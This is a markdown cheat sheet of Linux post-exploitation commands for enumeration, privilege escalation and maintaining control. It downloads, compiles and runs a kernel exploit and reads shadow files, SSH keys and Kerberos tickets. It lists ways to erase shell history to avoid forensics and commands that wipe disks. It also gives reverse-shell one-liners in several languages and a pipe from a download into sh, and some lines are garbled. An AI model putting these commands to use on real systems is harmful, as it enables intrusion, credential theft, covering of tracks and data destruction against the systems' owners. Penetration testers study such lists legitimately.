### general enumeration
```
cat /etc/issue
cat /proc/version
hostname
uname -a
uname -m
searchsploit linux kernel ##.## –exclude=”/dos/”
cat /etc/passwd
id
who
w
sudo -l
ifconfig -a
netstat -antup
arp -e
ps aux
ps aux | grep root
ls -ls /etc/ | grep .conf
ls -ls /var/www/html/
find /* -user root -perm -4000 -print 2>/dev/null
##-rwsr-xr-x [SUID exploitation eg using nano to edit /etc/passwd - see below] 
cat /etc/fstab
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
find /etc -perm -2 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
wget http://www.securitysift.com/download/linuxprivchecker.py
wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
./unix-privesc-check standard
./unix-privesc-check detailed
wget https://www.exploit-db.com/download/40616 -O cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

### LFI reading
```
/etc/resolv.conf
/etc/motd
/etc/issue
/etc/passwd	 
/etc/shadow
/home/xxx/.bash_history

```

### System
```
 uname -a                  
 ps aux                    
 top -n 1 -d               
 id                        
 arch, uname -m            
 w                         
 who -a                    
 gcc -v                    
 mysql --version           
 perl -v                   
 ruby -v                   
 python --version          
 df -k                     
 mount                     
 last -a                   
 lastcomm                  
 lastlog                   
 lastlogin (BSD)           
 getenforce                
 dmesg                     
 lspci                     
 lsusb                     
 lscpu                     
 lshw                      
 ex                        
 cat /proc/cpuinfo         
 cat /proc/meminfo         
 du -h --max-depth=1 /     
 which nmap                
 locate bin/nmap           
 locate bin/nc             
 jps -l                    
 java -version
 ```
 

### Networking


```
hostname -f
ip addr show
ip ro show
ifconfig -a
route -n
cat /etc/network/interfaces
iptables -L -n -v
iptables -t nat -L -n -v
ip6tables -L -n -v
iptables-save
netstat -anop
netstat -r
netstat -nltupw
arp -a
lsof -nPi
cat /proc/net/*
```

### User Accounts


```
cat /etc/passwd
cat /etc/shadow
/etc/security/passwd
cat /etc/group
getent passwd
getent group
pdbedit -L -w
pdbedit -L -v
cat /etc/aliases
find /etc -name aliases
getent aliases
ypcat passwd
```

### Obtain user's information
```
ls -alh /home/
ls -alh /home/
cat /home/
cat /home/
cat /home/\
find /home/\
grep ^ssh /home/
grep ^telnet /home/
grep ^mysql /home/
cat /home/
sudo -l # if sudoers is not. readable, this sometimes works per user
crontab -l
cat /home/
sudo -p (allows the user to define what the password prompt will be, useful for fun customization with aliases or shell scripts)
```

### Credentials
```


/home/\*/.ssh/id*
/tmp/krb5cc_*
/tmp/krb5.keytab
/home/*/.gnupg/secring.gpgs
```


### Configs
```
ls -aRl /etc/
cat /etc/issue{,.net}
cat /etc/master.passwd
cat /etc/group
cat /etc/hosts
cat /etc/crontab
cat /etc/sysctl.conf
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)
cat /etc/resolv.conf
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.confcda
cat /etc/inetd.conf
cat /opt/lampp/etc/httpd.conf
cat /etc/samba/smb.conf
cat /etc/openldap/ldap.conf
cat /etc/ldap/ldap.conf
cat /etc/exports
cat /etc/auto.master
cat /etc/auto_master
cat /etc/fstab
find /etc/sysconfig/ -type f -exec cat {} \;
```

### Determine Distro


```
uname -a
lsb_release -d
/etc/os-release
/etc/issue
cat /etc/*release
/etc/SUSE-release
/etc/redhat-release, /etc/redhat_version
/etc/fedora-release
/etc/slackware-release, /etc/slackware-version
/etc/debian_release, /etc/debian_version
/etc/mandrake-release
/etc/sun-release
/etc/release
/etc/gentoo-release
/etc/arch-release
arch
```


### Installed Packages
```
rpm -qa --last | head
yum list | grep installed
Debian
dpkg -l
dpkg -l | grep -i “linux-image”
dpkg --get-selections
{Free,Net}BSD: pkg_info
Solaris: pkginfo
Gentoo: cd /var/db/pkg/ && ls -d
Arch Linux: pacman -Q
```

### Package Sources
```
cat /etc/apt/sources.list
ls -l /etc/yum.repos.d/
cat /etc/yum.conf
```

### Finding Important Files
```
ls -dlR
ls -alR | grep ^d
find /var -type d
ls -dl \`find /var -type d\`
ls -dl \`find /var -type d\` | grep -v root
find /var ! -user root -type d -ls
find /var/log -type f -exec ls -la {} \;
find / -perm -4000 (find all suid files)
ls -alhtr /mnt
ls -alhtr /media
ls -alhtr /tmp
ls -alhtr /home
cd /home/; treels /home/
find /home -type f -iname '.
ls -lart /etc/rc.d/
locate tar | grep [.]tar$ # Remember to updatedb before running locate
locate tgz | grep [.]tgz$
locate sql | grep [.]sql$
locate settings | grep [.]php$
locate config.inc | grep [.]php$
ls /home/\
.properties | grep [.]properties # java config files
locate .xml | grep [.]xml # java/.net config files
find /sbin /usr/sbin /opt /lib \`echo $PATH | ‘sed s/:/ /g’\` -perm /6000 -ls # find suids
locate rhosts
```

### Avoiding history filesmys
```
export HISTFILE=

unset HISTFILE


history -c
rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)
touch ~/.bash_history (invasive)
<space> history -c (using a space before a command)
zsh% unset HISTFILE HISTSIZE
tcsh% set history=0
bash$ set +o history
ksh$ unset HISTFILE
find / -type f -exec {} (forensics nightmare)
```



### Deleting and Destroying


```
rm -rf /
mkfs.ext3 /dev/sda
dd if=/dev/zero of=/dev/sda bs=1M
```

## Escalating
```
ls -alh /root/
sudo -l
cat /etc/sudoers
cat /etc/shadow
cat /etc/master.passwd # OpenBSD
cat /var/spool/cron/crontabs/
lsof -nPi
ls /home/\
```
## Maintaining control


### Reverse Shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 (No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).
perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
xterm -display 10.0.0.1:1se
Listener- Xnest :1
Add permission to connect- xhost +victimIP
ssh -NR 3333:localhost:22 user@yourhost
nc -e /bin/sh 10.0.0.1 1234
```
### Execute a Remote Script
```
wget http://server/file.sh -O- | sh
```
